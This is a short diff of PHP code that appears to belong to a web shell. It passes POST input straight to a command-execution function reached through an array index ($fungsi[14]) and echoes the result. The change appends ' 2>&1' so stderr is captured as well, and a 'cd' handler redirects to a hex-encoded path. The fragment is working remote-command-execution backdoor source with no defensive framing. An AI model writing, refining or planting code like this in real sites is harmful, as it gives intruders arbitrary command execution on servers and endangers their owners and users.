@@ -199,7 +199,7 @@ $xpl = explode("-", $exp[2]);
                             $dataCMD = $_POST['value'];
                             $pecah = explode(" ", $dataCMD);
                             if ($pecah[0] == True) {
-                                echo htmlspecialchars($GLOBALS['fungsi'][14]($_POST['value']));
+                                echo htmlspecialchars($fungsi[14]($_POST['value'] . " 2>&1"));
                             }
                             if ($pecah[0] == "cd") {
                                 echo '<meta http-equiv="refresh" content="0;url=?cd=' . hex('/' . $pecah[1]) . '">';
